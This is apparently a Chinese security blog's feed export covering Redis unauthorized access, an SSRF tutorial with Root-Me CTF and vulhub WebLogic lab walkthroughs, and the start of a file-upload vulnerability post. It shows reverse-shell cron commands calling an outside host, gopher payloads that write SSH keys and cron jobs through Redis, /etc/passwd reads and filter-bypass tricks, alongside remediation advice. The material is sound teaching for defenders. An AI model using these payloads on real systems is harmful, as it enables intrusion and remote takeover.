redis-3.2.0make</code></pre><p>修改配置文件</p><pre><code>vi redis.confbind 127.0.0.1 加上#protected-mode yes  改为no</code></pre><p>在配置文件目录下启动</p><pre><code>./src/redis-server redis.conf</code></pre><p>启动后显示如下：</p><p><img src="\2019\06\越权-未授权访问\1560837844041.png" alt="1560837844041"></p><p>通过reids命令可以查看基本信息</p><p><img src="\2019\06\越权-未授权访问\1560837899368.png" alt="1560837899368"></p><p>尝试反弹shell到指定地址</p><pre><code>set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.30.79/2333 0&gt;&amp;1\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave</code></pre><p>或者采用gopher协议，直接利用curl一条命令执行</p><p><img src="\2019\06\越权-未授权访问\1560840948082.png" alt="1560840948082"></p><h2 id="0x08、漏洞修复"><a href="#0x08、漏洞修复" class="headerlink" title="0x08、漏洞修复"></a>0x08、漏洞修复</h2><p>1、验证需要从前端获取的参数，比如用户ID和角色权限名，对于需要根据前台请求来返回数据的参数进行权限效验。</p><p>2、对于固定返回信息可以使用特定链接地址返回，同时采用不可预测地址，如：getuserinfo_snhx.php</p><p>3、对于需要修改、新增等功能进行判断，根据当前seesion判断用户，参数中只传输修改的用户信息。</p><p>4、区分用户和管理员时，不采用某些相同的参数来区别。如dede区分管理和用户都是采用ID值，容易产生问题。</p><p>5、对于查询类越权需要对每一次请求的参数做当前用户身份效验，避免水平越权。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01、漏洞简介&quot;&gt;&lt;a href=&quot;#0x01、漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01、漏洞简介&quot;&gt;&lt;/a&gt;0x01、漏洞简介&lt;/h2&gt;&lt;p&gt;未授权访问，顾名思义不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SSRF</title>
    <link href="/2019/06/SSRF/"/>
    <id>/2019/06/SSRF/</id>
    <published>2019-06-14T07:46:34.000Z</published>
    <updated>2019-06-14T07:58:43.364Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01、漏洞简介"><a href="#0x01、漏洞简介" class="headerlink" title="0x01、漏洞简介"></a>0x01、漏洞简介</h3><p>​    SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p><h3 id="0x02、漏洞原理"><a href="#0x02、漏洞原理" class="headerlink" title="0x02、漏洞原理"></a>0x02、漏洞原理</h3><p>​    通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。</p><h3 id="0x03、漏洞危害"><a href="#0x03、漏洞危害" class="headerlink" title="0x03、漏洞危害"></a>0x03、漏洞危害</h3><ol><li>扫描内网开放服务</li><li>向内部任意主机的任意端口发送payload来攻击内网服务</li><li>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</li><li>攻击内网的web应用，例如直接SQL注入、XSS攻击等</li><li>利用file、gopher、dict协议读取本地文件、执行命令等</li></ol><h3 id="0x04、检测与绕过"><a href="#0x04、检测与绕过" class="headerlink" title="0x04、检测与绕过"></a>0x04、检测与绕过</h3><h4 id="0x04-1、漏洞检测"><a href="#0x04-1、漏洞检测" class="headerlink" title="0x04-1、漏洞检测"></a>0x04-1、漏洞检测</h4><p>假设一个漏洞场景：某网站有一个在线加载功能可以把指定的远程图片加载到本地，功能链接如下：</p><pre><code>http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg</code></pre><p>那么网站请求的大概步骤应该是类似以下：</p><p>用户输入图片地址-&gt;请求发送到服务端解析-&gt;服务端请求链接地址的图片数据-&gt;获取请求的数据加载到前台显示。</p><p>这个过程中可能出现问题的点就在于请求发送到服务端的时候，系统没有效验前台给定的参数是不是允许访问的地址域名，例如，如上的链接可以修改为：</p><pre><code>http://www.xxx.com/image.php?image=http://127.0.0.1:22</code></pre><p>如上请求时则可能返回请求的端口banner。如果协议允许，甚至可以使用其他协议来读取和执行相关命令。例如</p><pre><code>http://www.xxx.com/image.php?image=file:///etc/passwdhttp://www.xxx.com/image.php?image=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求data data2)http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test (向2233端口发送数据test,同样可以发送POST请求)......</code></pre><p>对于不同语言实现的web系统可以使用的协议也存在不同的差异，其中：</p><pre><code>php:http、https、file、gopher、phar、dict、ftp、ssh、telnet...java:http、https、file、ftp、jar、netdoc、mailto...</code></pre><p>判断漏洞是否存在的重要前提是，请求的服务器发起的，以上链接即使存在并不一定代表这个请求是服务器发起的。因此前提不满足的情况下，SSRF是不必要考虑的。</p><pre><code>http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg</code></pre><p>链接获取后，是由js来获取对应参数交由window.location来处理相关的请求，或者加载到当前的iframe框架中，此时并不存在SSRF ，因为请求是本地发起，并不能产生攻击服务端内网的需求。</p><h4 id="0x04-2、漏洞出现点"><a href="#0x04-2、漏洞出现点" class="headerlink" title="0x04-2、漏洞出现点"></a>0x04-2、漏洞出现点</h4><ol><li>分享：通过url 地址分享文章，例如如下地址：</li></ol><p><a href="http://share.xxx.com/index.php?url=http://127.0.0.1" target="_blank" rel="noopener">http://share.xxx.com/index.php?url=http://127.0.0.1</a></p><p>通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</p><ol start="2"><li>图片加载与下载：通过URL地址加载或下载图片</li></ol><p><a href="http://image.xxx.com/image.php?image=http://127.0.0.1" target="_blank" rel="noopener">http://image.xxx.com/image.php?image=http://127.0.0.1</a></p><p>图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。</p><ol start="3"><li>图片、文章收藏功能</li></ol><p><a href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de" target="_blank" rel="noopener">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p><p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p><ol start="4"><li>利用参数中的关键字来查找</li></ol><p>例如以下的关键字：</p><pre><code>sharewapurllinksrcsourcetargetu3gdisplaysourceURlimageURLdomain...</code></pre><h4 id="0x04-3、漏洞绕过"><a href="#0x04-3、漏洞绕过" class="headerlink" title="0x04-3、漏洞绕过"></a>0x04-3、漏洞绕过</h4><p>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</p><p>1、限制为<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> 域名时：<br>可以尝试采用http基本身份认证的方式绕过，<a href="http://www.xxx.com@www.xxc.com。" target="_blank" rel="noopener">http://www.xxx.com@www.xxc.com。</a><br>在对@解析域名中，不同的处理函数存在处理差异，例如：<br><a href="http://www.aaa.com@www.bbb.com@www.ccc.com，在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。" target="_blank" rel="noopener">http://www.aaa.com@www.bbb.com@www.ccc.com，在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</a><br>2、限制请求IP不为内网地址：<br>采用短网址绕过，比如百度短地址<a href="https://dwz.cn/。" target="_blank" rel="noopener">https://dwz.cn/。</a><br>采用可以指向任意域名的xip.io，127.0.0.1.xip.io，可以解析为127.0.0.1<br>采用进制转换，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433</p><p><img src="\2019\06\SSRF\1560153991783.png" alt="1560153991783"></p><p>3、限制请求只为http协议：</p><p>采用302跳转，百度短地址，或者使用<a href="https://tinyurl.com生成302跳转地址。使用如下：" target="_blank" rel="noopener">https://tinyurl.com生成302跳转地址。使用如下：</a></p><p><img src="\2019\06\SSRF\1560154250368.png" alt="1560154250368"></p><p>4、其他绕过形式可以查看：<a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/65832.html</a></p><h3 id="0x05、测试方法"><a href="#0x05、测试方法" class="headerlink" title="0x05、测试方法"></a>0x05、测试方法</h3><p>漏洞环境：PHP脚本、Windows</p><p>利用工具：bash、nc</p><p>首先采用如下脚本创建一个PHP的服务端</p><pre><code>&lt;?PHP$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0); #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_exec($ch); curl_close($ch);  ?&gt;</code></pre><p>开启PHP的web环境，访问<a href="http://localhost/ssrf.php?url=，页面显示正常即可。在一个bash中开启监听端口，来模仿即将被SSRF到的内网服务，此处采用nc。" target="_blank" rel="noopener">http://localhost/ssrf.php?url=，页面显示正常即可。在一个bash中开启监听端口，来模仿即将被SSRF到的内网服务，此处采用nc。</a></p><p>浏览器访问如下链接：<code>http://localhost/ssrf.php?url=http://127.0.0.1:2233</code>。监听端可以看到来自localhost的请求，请求目标为127.0.0.1的2233端口。</p><p><img src="\2019\06\SSRF\1560156050670.png" alt="1560156050670"></p><p>使用gopher协议来查看协议，访问：<code>http://localhost/ssrf.php?url=gopher://127.0.0.1:2233/_test</code></p><p><img src="\2019\06\SSRF\1560156243997.png" alt="1560156243997"></p><p>利用gopher发送POST的请求，访问：<code>http://localhost/ssrf.php?url=gopher://127.0.0.1:2233/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20127.0.0.1%3A2233%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dpassword</code></p><p><img src="\2019\06\SSRF\1560157345590.png" alt="1560157345590"></p><p>以上方式简单的展示了SSRF的攻击过程和请求，下面我们使用回显形SSRF。</p><p>漏洞环境：Ubuntu 18、 docker 、PHP、Apache</p><p>漏洞文件地址：<a href="https://github.com/nikosdano/SSRF-Vulnerable-with-Curl" target="_blank" rel="noopener">https://github.com/nikosdano/SSRF-Vulnerable-with-Curl</a></p><p>下载文件放入apache服务器中，访问<a href="http://192.168.120.132/awesome_script.php" target="_blank" rel="noopener">http://192.168.120.132/awesome_script.php</a></p><p><img src="\2019\06\SSRF\1560158703440.png" alt="1560158703440"></p><p>在其中我们可以填写想要执行的SSRF命令，如填写<code>file:///etc/passwd</code>，回显为：</p><p><img src="\2019\06\SSRF\1560158751037.png" alt="1560158751037"></p><p>尝试端口探测，对22端口进行探测是否开启：</p><p><img src="\2019\06\SSRF\1560159113711.png" alt="1560159113711"></p><p>截至到此，相信对SSRF已经有了一个简单认识和检测，下面我们利用一个靶场来模拟一个完整的真实的SSRF攻击。</p><h3 id="0x06、实战演示"><a href="#0x06、实战演示" class="headerlink" title="0x06、实战演示"></a>0x06、实战演示</h3><p>漏洞环境：Rootme CTF all the day</p><p>漏洞地址：<a href="https://www.root-me.org/en/Capture-The-Flag/CTF-all-the-day/" target="_blank" rel="noopener">https://www.root-me.org/en/Capture-The-Flag/CTF-all-the-day/</a></p><p>利用工具：Burp</p><p>漏洞介绍：SSRF+redis 获取内网主机权限，利用SSRF来对redis的未授权访问执行命令。从而达到获取主机权限的目的</p><p>访问目标地址，如果没有账号，需要创建账号点击右上的绿色小加号来创建账号，创建完成后回到此页面。</p><p>找到一个处于none的虚拟机，点击房间名，如下的ctf04</p><p><img src="\2019\06\SSRF\1560159824044.png" alt="1560159824044"></p><p>进入房间后，选择需要创建的虚拟机，选择SSRF Box，点击保存，选择start the game。</p><p><img src="\2019\06\SSRF\1560159878492.png" alt="1560159878492"></p><p>过一段时间的等待后，会显示如下信息。</p><p><img src="\2019\06\SSRF\1560235776984.png" alt="1560235776984"></p><p>访问 ctf04.root-me.org 就可以看到启动的虚拟环境了</p><p><img src="\2019\06\SSRF\1560235872860.png" alt="1560235872860"></p><p>当然，如果在创建虚拟机之前，看到其他的房间有人已经创建了SSRF Box我们也可以加入此玩家的房间，点击房间名，进入房间后点击右上角的Join the game。稍等片刻就可以加入到游戏中，根据提示访问对应的地址就可以开始测试啦。</p><p>访问地址后可以看到页面显示一个输入框，需要输入url参数，开始抓包。</p><p><img src="\2019\06\SSRF\1560235989336.png" alt="1560235989336"></p><p>尝试在页面输入百度地址后，页面会把百度首页加载进此页面中。</p><p><img src="\2019\06\SSRF\1560236149809.png" alt="1560236149809"></p><p>读取系统文件：</p><p><img src="\2019\06\SSRF\1560236739185.png" alt="1560236739185"></p><p>使用burp的Intruder模块，来探测开放的服务端口，开放则显示OK，不开放则显示Connection refused。</p><p><img src="\2019\06\SSRF\1560238637396.png" alt="1560238637396"></p><p>探测可知内网开放了6379端口redis服务，尝试利用SSRF对redis执行未授权漏洞，此处简单科普一下redis漏洞影响。</p><p>详细内容可以查看文章：<a href="https://www.freebuf.com/vuls/162035.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/162035.html</a></p><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p><p>因此，此漏洞在没有配置密码的情况下可以利用SSRF来绕过绑定在本地的限制，从而实现在外网攻击内网应用。</p><p>1、利用redis来写ssh密钥：</p><p>此处利用ssh生成一对公私钥，生成的默认文件为id_rsa.pub和id_rsa。把id_rsa.pub上传至服务器即可。我们利用redis把目录设置为ssh目录下：</p><p>根据网上写密钥有两种协议可以使用，一种是dict，一种是gopher。测试使用dict协议写不成功，写入后不能连接，此处使用gopher写密钥。</p><p>使用的payload为：</p><pre><code>gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$401%0d%0a%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU+RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code></pre><p>payload 解码为：</p><pre><code>gopher://127.0.0.1:6379/_*3$3set$11$401ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9*4$6config$3set$3dir$11/root/.ssh/*4$6config$3set$10dbfilename$15authorized_keys*1$4save*1$4quit</code></pre><p>payload由joychou的反弹shell修改而来，主要就是替换了写入文件的位置和文件内容。然后修改文件的长度。</p><p>然后尝试登陆，输入创建密钥的密码后，登陆成功。</p><p><img src="\2019\06\SSRF\1560327409402.png" alt="1560327409402"></p><p>2、利用redis写定时任务来反弹shell</p><p>既然提到反弹shell，就需要利用一台外网主机。此处使用了nc做端口监听。</p><p>使用payload为以下：</p><pre><code>gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2233 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code></pre><p>解码后的内容就是：</p><pre><code>gopher://127.0.0.1:6379/_*3$3set$11$61*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2233 0&gt;&amp;1*4$6config$3set$3dir$16/var/spool/cron/*4$6config$3set$10dbfilename$4root*1$4save*1$4quit</code></pre><p>来自：<a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a></p><p>其中$61为我的vps地址，也就是<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a</code>的字符串长度。执行后稍等片刻就可以收到反弹的shell了。同时需要写入的命令前后要加几个回车。</p><p><img src="\2019\06\SSRF\1560323581419.png" alt="1560323581419"></p><p>根据前文的提示，打开/passwd文件就可以找到flag了。</p><p><img src="\2019\06\SSRF\1560323642659.png" alt="1560323642659"></p><p>在网站页面上输入这一串字符，就可以结束这场SSRF之旅了。</p><p><img src="\2019\06\SSRF\1560325344529.png" alt="1560325344529"></p><h3 id="0x07、CMS实战演示"><a href="#0x07、CMS实战演示" class="headerlink" title="0x07、CMS实战演示"></a>0x07、CMS实战演示</h3><p>漏洞环境：vulhub、weblogic、ssrf</p><p>漏洞介绍：CVE-2014-4210，weblogic的uddiexplorer.war存在安全组件漏洞，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的机密性。该漏洞的影响版本包括：10.0.2.0, 10.3.6.0</p><p>漏洞下载地址：<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></p><p>下载vulhub后，进入对应的安装目录，执行<code>docker-compose up -d</code>,会自动创建docker镜像。</p><p>构建完成后访问如下地址：</p><pre><code>/uddiexplorer/SearchPublicRegistries.jsp</code></pre><p><img src="\2019\06\SSRF\1560402971016.png" alt="1560402971016"></p><p>访问如下地址时返回，代表端口未开放：</p><pre><code>/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80</code></pre><p><img src="\2019\06\SSRF\1560403060035.png" alt="1560403060035"></p><pre><code>/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</code></pre><p>响应可以看到返回404，证明端口开放：</p><p><img src="\2019\06\SSRF\1560403107077.png" alt="1560403107077"></p><p>然后可以根据遍历查看开放的端口服务，在根据开放的服务来决定是否能不能执行内网攻击。而实际中越到的SSRF大都是探测类使用，因为能正好搭配使用的情况，而且还可以查看或者反弹的，概率值得讨论。</p><p>漏洞修复：1.删除server/lib/uddiexplorer.war下的相应jsp文件。</p><pre><code>jar -xvf uddiexplorer.war rm jsp-files jar -cvfM uddiexplorer.war uddiexplorer/</code></pre><ol start="2"><li>在官方的漏洞通报上找到补丁安装，<a href="https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html</a></li></ol><h3 id="0x08、漏洞修复"><a href="#0x08、漏洞修复" class="headerlink" title="0x08、漏洞修复"></a>0x08、漏洞修复</h3><p>SSRF漏洞修复：</p><ol><li>限制返回信息的，例如请求文件，只返回文件是否请求成功，没有请求成功到文件统一返回错误信息。</li><li>对请求地址设置白名单，只允许请求白名单内的地址。</li><li>禁用除http和https外的协议，如：file://，gopher://，dict://等</li><li>限制请求的端口为固定服务端口，如：80，443</li><li>Java类代码修复，来自：joychou</li></ol><p>方法调用：</p><pre><code class="java">String[] urlwhitelist = {&quot;joychou.com&quot;, &quot;joychou.me&quot;};if (!UrlSecCheck(url, urlwhitelist)) {    return;}   </code></pre><p>方法代码：</p><p>需要先添加guava库（目的是获取一级域名）</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;com.google.guava&lt;/groupId&gt;    &lt;artifactId&gt;guava&lt;/artifactId&gt;    &lt;version&gt;21.0&lt;/version&gt;&lt;/dependency&gt;方法实现：public static Boolean UrlSecCheck(String url, String[] urlwhitelist) {    try {        URL u = new URL(url);        // 只允许http和https的协议        if (!u.getProtocol().startsWith(&quot;http&quot;) &amp;&amp; !u.getProtocol().startsWith(&quot;https&quot;)) {            return  false;        }        // 获取域名，并转为小写        String host = u.getHost().toLowerCase();        // 获取一级域名        String rootDomain = InternetDomainName.from(host).topPrivateDomain().toString();        for (String whiteurl: urlwhitelist){            if (rootDomain.equals(whiteurl)) {                return true;            }        }        return false;    } catch (Exception e) {        return false;    }}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01、漏洞简介&quot;&gt;&lt;a href=&quot;#0x01、漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01、漏洞简介&quot;&gt;&lt;/a&gt;0x01、漏洞简介&lt;/h3&gt;&lt;p&gt;​    SSRF(Server-Side Request Forgery:服务器端
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="/2019/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>/2019/05/文件上传漏洞/</id>
    <published>2019-05-30T06:11:55.000Z</published>
    <updated>2019-06-03T01:50:18.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01、漏洞简介"><a href="#0x01、漏洞简介" class="headerlink" title="0x01、漏洞简介"></a>0x01、漏洞简介</h2><p>​       文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的漏洞，是程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。</p><h2 id="0x02、漏洞原理"><a href="#0x02、漏洞原理" class="headerlink" title="0x02、漏洞原理"></a>0x02、漏洞原理</h2><p>​        网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。 </p><h2 id="0x03、漏洞危害"><a href="#0x03、漏洞危害" class="headerlink" title="0x03、漏洞危害"></a>0x03、漏洞危害</h2><p>​        恶意文件传递给解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。根据网站使用及可解析的程序脚本不同，可以上传的恶意脚本可以是PHP、ASP、JSP、ASPX文件。</p><h2 id="0x04、常用绕过形式"><a href="#0x04、常用绕过形式" class="headerlink" title="0x04、常用绕过形式"></a>0x04、常用绕过形式</h2><h3 id="0x04-1、文件长传常见点"><a href="#0x04-1、文件长传常见点" class="headerlink" title="0x04-1、文件长传常见点"></a>0x04-1、文件长传常见点</h3><pre><code>上传头像上传相册上传附件添加文章图片前台留言资料上传编辑器文件上传......</code></pre><p>例如如下编辑器上传点：</p><p><img src="/2019/05/文件上传漏洞/1559525399747.png" alt="1559525399747"></p><p>文件管理处文件上传：</p><p><img src="/2019/05/文件上传漏洞/1559525465670.png" alt="1559525465670"></p><p>前台用户发表文章处文件上传：</p><p><img src="/2019/05/文件上传漏洞/1559525540726.png" alt="1559525540726"></p><p>个人头像处文件上传：</p><p><img src="/2019/05/文件上传漏洞/1559525602088.png" alt="1559525602088"></p><h3 id="0x04-2、后缀绕过"><a href="#0x04-2、后缀绕过" class="headerlink" title="0x04-2、后缀绕过"></a>0x04-2、后缀绕过</h3><pre><code>PHP:php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)ASP：asa、cer、cdxASPX：ascx、ashx、asacJSP：jsp、jspx、jspf</code></pre><h3 id="0x04-3、绕过类型"><a href="#0x04-3、绕过类型" class="headerlink" title="0x04-3、绕过类型"></a>0x04-3、绕过类型</h3><pre><code>Content-Type绕过前端绕过文件解析规则绕过Windows环境特性绕过文件名大小写绕过双写绕过点空格绕过文件头绕过条件竞争绕过......</code></pre><p>在以下的文章介绍中，将采取其中的几种常见的绕过形式做演示。</p><h2 id="0x05、漏洞在系统中的差异"><a href="#0x05、漏洞在系统中的差异" class="headerlink" title="0x05、漏洞在系统中的差异"></a>0x05、漏洞在系统中的差异</h2><p>​        上传文件漏洞在不同的系统、架构以及行为中，利用形式也是各不相同。常用的web容器有IIS、Tomcat、Nginx、Apache等。以下主要以比较经典的解析漏洞做解释。</p><h3 id="0x05-1、IIS-5-x-6-0解析漏洞"><a href="#0x05-1、IIS-5-x-6-0解析漏洞" class="headerlink" title="0x05-1、IIS 5.x/6.0解析漏洞"></a>0x05-1、IIS 5.x/6.0解析漏洞</h3><pre><code>1、当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件。例如如下：漏洞目录利用形式：www.xxx.com/xx.asp/xx.jpg。xx.jpg的内容可以为一段合法的asp脚本文件。2、服务器默认不解析”;“以后的内容，导致xx.asp;.jpg被解析成xx.asp漏洞文件利用形式：www.xxx.com/xx.asp;.jpgxx.jpg的内容可以为一段合法的asp脚本文件。</code></pre><p>漏洞产生的原因参考详细文章内容：<a href="https://www.cnblogs.com/l1pe1/p/9210094.html" target="_blank" rel="noopener">https://www.cnblogs.com/l1pe1/p/9210094.html</a></p><pre><code>通过对IIS6的核心文件类型解析相关文件的逆向后，整理出下面的核心处理代码。//reverse code by golds7n with idaint __thiscall Url(void *this, char *UrlStruct){  void *pW3_URL_INFO; // esi@1  int bSuccess; // eax@1  const wchar_t *i; // eax@2  wchar_t *wcsSlashTemp; // ebx@6  int wcsTemp; // eax@6  int wcs_Exten; // eax@6  int v8; // esi@9  int v10; // eax@11  int v11; // ST04_4@13  int v12; // eax@13  int ExtenDll; // eax@19  int Extenisa; // eax@20  int ExtenExe; // eax@21  int ExtenCgi; // eax@22  int ExtenCom; // eax@23  int ExtenMap; // eax@24  int Entry; // [sp+Ch] [bp-148h]@6  wchar_t *wcsMaohaoTemp; // [sp+10h] [bp-144h]@6  unsigned int dotCount; // [sp+14h] [bp-140h]@1  wchar_t *Str; // [sp+18h] [bp-13Ch]@3  char *url_FileName; // [sp+1Ch] [bp-138h]@1  char Url_FileExtenName; // [sp+20h] [bp-134h]@1  char v25; // [sp+50h] [bp-104h]@1 dotCount = 0;  pW3_URL_INFO = this;  STRU::STRU(&amp;Url_FileExtenName, &amp;v25, 0x100u);  url_FileName = (char *)pW3_URL_INFO + 228;  bSuccess = STRU::Copy((char *)pW3_URL_INFO + 228, UrlStruct);  if ( bSuccess &lt; 0 )    goto SubEnd;  for ( i = (const wchar_t *)STRU::QueryStr((char *)pW3_URL_INFO + 228); ; i = Str + 1 )  {    Str = _wcschr(i, &#39;.&#39;);   ***********N1************    if ( !Str )      break;    ++dotCount;    if ( dotCount &gt; W3_URL_INFO::sm_cMaxDots )      break;    bSuccess = STRU::Copy(&amp;Url_FileExtenName, Str);    if ( bSuccess &lt; 0 )      goto SubEnd;    wcsSlashTemp = _wcschr(Str, &#39;/&#39;); ***********N2************    JUMPOUT(wcsSlashTemp, 0, loc_5A63FD37);    wcsTemp = STRU::QueryStr(&amp;Url_FileExtenName);    wcsMaohaoTemp = _wcschr((const wchar_t *)wcsTemp, &#39;:&#39;);  ***********N3************    JUMPOUT(wcsMaohaoTemp, 0, loc_5A63FD51);    wcs_Exten = STRU::QueryStr(&amp;Url_FileExtenName);    __wcslwr((wchar_t *)wcs_Exten);    if ( META_SCRIPT_MAP::FindEntry(&amp;Url_FileExtenName, &amp;Entry) )    {      *((_DWORD *)pW3_URL_INFO + 201) = Entry;      JUMPOUT(wcsSlashTemp, 0, loc_5A63FDAD);      STRU::Reset((char *)pW3_URL_INFO + 404);      break;    }    if ( STRU::QueryCCH(&amp;Url_FileExtenName) == 4 )    {      ExtenDll = STRU::QueryStr(&amp;Url_FileExtenName);      if ( !_wcscmp(L&quot;.dll&quot;, (const wchar_t *)ExtenDll)        || (Extenisa = STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.isa&quot;, (const wchar_t *)Extenisa)) )        JUMPOUT(loc_5A63FD89);      ExtenExe = STRU::QueryStr(&amp;Url_FileExtenName);      if ( !_wcscmp(L&quot;.exe&quot;, (const wchar_t *)ExtenExe)        || (ExtenCgi = STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.cgi&quot;, (const wchar_t *)ExtenCgi))        || (ExtenCom = STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.com&quot;, (const wchar_t *)ExtenCom)) )        